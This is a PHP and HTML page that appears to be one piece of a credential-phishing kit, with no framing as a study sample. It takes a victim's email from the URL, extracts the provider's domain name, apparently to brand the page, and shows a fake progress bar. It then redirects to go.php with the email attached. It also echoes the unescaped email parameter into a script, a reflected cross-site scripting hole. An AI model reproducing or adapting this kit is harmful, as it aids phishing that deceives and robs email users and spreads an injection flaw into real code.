<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

<head>

<title></title>

<link rel="icon" href="./files/favicon.png" sizes="16x16" type="image/png">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">


<style>
* { font-family: "Arial", sans-serif; }
#wrap { margin-top: 50px;text-align: center; }
#barwrap { 
position: relative; /* to contain outer */ 
margin: 0 auto; /* to centre */ 
width: 500px;height: 22px; /* size of our bar - required */ 
text-align: left; 
font-weight: bold; 
font-family: Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif; 
font-size: 15px;
-moz-border-radius: 4px; -webkit-border-radius: 4px; -khtml-border-radius: 4px; border-radius: 4px;
-moz-box-shadow: 5px 5px 5px #000000; -webkit-box-shadow: 5px 5px 5px #000000; box-shadow: 5px 5px 5px #000000;
}
#barwrap P { /* to contain text */ 
margin: 0; /* FF needs this or text drops below bar */ 
width: 500px; /* use this node to position text */ 
text-align: center; 
}
#barwrap #outer { /* bar 'background' */ 
position: absolute; 
width: 100%; height: 100%; /* match parent size */ 
background: #08298A; 
color: #FFF; /* original colour of text */
}
#barwrap #inner { 
position: relative; /* otherwise outer hides us */ 
width: 0; height: 100%; /* match parent */ 
overflow: hidden; /* to hide new text/prevent it wrapping */ 
background: black; 
color: #FFF; /* colour of changed text */ 
}
</style>
<script>
var time = 10000; // 10 secs 
var steps = 50; // Five per second 
var step = 1;
function progress() { 
var bar = document.getElementById( "barwrap"); 
var aStep = (bar.offsetWidth -2) /steps;// 2px border removed from width 
var x = Math.round( aStep *step); 
var outer = document.getElementById( "outer"); 
var inner = document.getElementById( "inner");
// Work out seconds based on % progress from current step 
var secs = (( time /1000) -Math.floor( ( step /steps) *10));
inner.style.width = x +"px"; 
step++;
// If 0 seconds, display waiting message instead 
outer.firstChild.innerHTML = ( secs? secs +" seconds...": "Success..."); 
// Match text 
inner.firstChild.innerHTML = outer.firstChild.innerHTML;
if( step <= steps) setTimeout( "progress();", time /steps); 
window.location = 'go.php?email=<?php echo $login ?>'; 
}
</script>

</head>

<body bgcolor="#E6E6E6">

 
<div id='wrap'> 
<div id='barwrap'> <!-- P wrappers for text positioning --> 
<div id='outer'><p></p></div> <!-- original colour/text --> 
<div id='inner'><p></p></div> <!-- new colour/text --> 
</div>
<br> 
<body onload="progress();">
</div>

</body>

</html>